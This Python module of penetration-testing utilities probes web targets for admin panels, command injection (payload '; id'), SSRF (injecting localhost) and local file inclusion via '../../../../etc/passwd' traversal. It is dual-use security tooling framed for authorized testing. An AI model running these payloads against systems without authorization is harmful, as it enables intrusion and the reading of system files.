"""
Advanced Security Testing Utilities
====================================

This module provides specialized functions for security testing that can be reused in
penetration tests. Functions include tools for admin panel detection, command injection testing,
Server-Side Request Forgery (SSRF) testing, and Local File Inclusion (LFI) testing.

Functions:
    - admin_panel_finder: Attempts to detect admin login panels using common URL endpoints.
    - command_injection_tester: Tests for command injection vulnerabilities by sending payloads.
    - ssrf_tester: Checks for SSRF vulnerabilities by injecting internal URLs.
    - file_inclusion_tester: Tests for LFI vulnerabilities by performing directory traversal.
    
Usage:
    >>> panels = admin_panel_finder("http://example.com/")
    >>> print("Found admin panels:", panels)
    >>>
    >>> cmd_result = command_injection_tester("http://example.com/submit", "username", injection_payload="; id")
    >>> print("Command Injection Result:", cmd_result)
    >>>
    >>> ssrf_result = ssrf_tester("http://example.com/fetch", "url", internal_url="http://localhost")
    >>> print("SSRF Test Result:", ssrf_result)
    >>>
    >>> lfi_result = file_inclusion_tester("http://example.com/view", "page", payload="../../../../etc/passwd")
    >>> print("LFI Test Result:", lfi_result)
"""

import requests
import time
from urllib.parse import urljoin

def admin_panel_finder(base_url: str, admin_paths: list = None, timeout: int = 3) -> list:
    """
    Attempts to detect administration panels by checking common admin URL endpoints.

    Args:
        base_url (str): The base URL of the target (e.g., "http://example.com/").
        admin_paths (list, optional): A list of potential admin URL paths. 
            If not provided, defaults to common admin endpoints.
        timeout (int, optional): Timeout (in seconds) for each HTTP request. Default is 3.

    Returns:
        list: A list of URLs where an admin panel might be accessible. 
              (HTTP status 200 or 403 are considered potential indicators.)

    Example:
        >>> panels = admin_panel_finder("http://example.com/")
        >>> print("Found admin panels:", panels)
    """
    if admin_paths is None:
        admin_paths = [
            "admin", "administrator", "admin/login", "admin.php", "admin/login.php",
            "cpanel", "backend", "admin_area", "adminpanel"
        ]
    found_panels = []
    for path in admin_paths:
        url = urljoin(base_url, path)
        try:
            response = requests.get(url, timeout=timeout)
            if response.status_code in [200, 403]:
                # 403 could mean the admin panel exists but access is forbidden.
                found_panels.append(url)
        except requests.RequestException:
            # Silently ignore timeouts or connection issues on a particular endpoint.
            continue
    return found_panels

def command_injection_tester(target_url: str, param: str, injection_payload: str = "; id", timeout: int = 5) -> dict:
    """
    Tests for command injection vulnerabilities by sending a suspicious payload.

    This function sends an HTTP POST request with the payload appended. If the payload 
    successfully executes system commands on a vulnerable system, you might detect command output.

    Args:
        target_url (str): The URL of the vulnerable endpoint.
        param (str): The parameter name where the injection is to be applied.
        injection_payload (str, optional): The payload to test command injection.
            Default is "; id" (commonly used for Unix-based systems).
        timeout (int, optional): Timeout for the HTTP request in seconds. Default is 5.

    Returns:
        dict: A dictionary containing:
            - "success": Boolean indicating if injection output appears detected.
            - "response": The text content of the HTTP response.
            - "error": Error message (if an exception occurred).

    Example:
        >>> result = command_injection_tester("http://example.com/submit", "username", injection_payload="; id")
        >>> if result.get("success"):
        ...     print("Command Injection Vulnerability Detected!")
        ... else:
        ...     print("Target appears secure.")
    """
    data = {param: injection_payload}
    try:
        response = requests.post(target_url, data=data, timeout=timeout)
        # Check for typical command output patterns (e.g., 'uid=' for Unix systems)
        injection_success = "uid=" in response.text or "gid=" in response.text
        return {"success": injection_success, "response": response.text}
    except Exception as e:
        return {"error": str(e)}

def ssrf_tester(target_url: str, param: str, internal_url: str = "http://localhost", timeout: int = 5) -> dict:
    """
    Tests for Server-Side Request Forgery (SSRF) vulnerabilities by injecting an internal URL.

    Args:
        target_url (str): The endpoint that accepts a URL parameter.
        param (str): The parameter name that the vulnerable function expects.
        internal_url (str, optional): An internal URL to inject. Defaults to "http://localhost".
        timeout (int, optional): Timeout for the HTTP request in seconds. Default is 5.

    Returns:
        dict: A dictionary containing:
            - "status_code": HTTP status code of the response.
            - "response_size": Length of the response content.
            - "error": Error message (if an error occurred).

    Example:
        >>> ssrf_result = ssrf_tester("http://example.com/fetch", "url", internal_url="http://localhost")
        >>> print(ssrf_result)
    """
    params = {param: internal_url}
    try:
        response = requests.get(target_url, params=params, timeout=timeout)
        return {"status_code": response.status_code, "response_size": len(response.text)}
    except Exception as e:
        return {"error": str(e)}

def file_inclusion_tester(target_url: str, param: str, payload: str = "../../../../etc/passwd", timeout: int = 5) -> dict:
    """
    Tests for Local File Inclusion (LFI) vulnerabilities by attempting directory traversal.

    The function sends an HTTP GET request with a payload that traverses directories. Responses
    returning contents that include system-specific markers (e.g., "root:" in Unix) may indicate
    vulnerability.

    Args:
        target_url (str): The vulnerable endpoint accepting a filename parameter.
        param (str): The parameter name where the payload will be injected.
        payload (str, optional): The directory traversal payload. Defaults to "../../../../etc/passwd".
        timeout (int, optional): Timeout for the HTTP request in seconds. Default is 5.

    Returns:
        dict: A dictionary containing:
            - "lfi_vulnerable": Boolean indicating potential vulnerability.
            - "output": A snippet of the returned text if vulnerable.
            - "error": Error message (if an exception occurred).

    Example:
        >>> lfi_result = file_inclusion_tester("http://example.com/view", "page", payload="../../../../etc/passwd")
        >>> if lfi_result.get("lfi_vulnerable"):
        ...     print("LFI Vulnerability Confirmed!")
        ...     print("Output snippet:", lfi_result.get("output"))
    """
    params = {param: payload}
    try:
        response = requests.get(target_url, params=params, timeout=timeout)
        if "root:" in response.text:
            return {"lfi_vulnerable": True, "output": response.text[:500]}
        return {"lfi_vulnerable": False}
    except Exception as e:
        return {"error": str(e)}

# Example usage of specialized functions:
if __name__ == "__main__":
    # Note: Replace the URLs below with your authorized target(s) for testing.
    print("Admin Panel Finder Test")
    admin_panels = admin_panel_finder("http://example.com/")
    print("Potential admin panels found:", admin_panels)
    
    print("\nCommand Injection Testing")
    cmd_inj_result = command_injection_tester("http://example.com/submit", "username", injection_payload="; id")
    print("Command Injection Result:", cmd_inj_result)
    
    print("\nSSRF Testing")
    ssrf_result = ssrf_tester("http://example.com/fetch", "url", internal_url="http://localhost")
    print("SSRF Test Result:", ssrf_result)
    
    print("\nLocal File Inclusion (LFI) Testing")
    lfi_result = file_inclusion_tester("http://example.com/view", "page", payload="../../../../etc/passwd")
    print("LFI Test Result:", lfi_result)
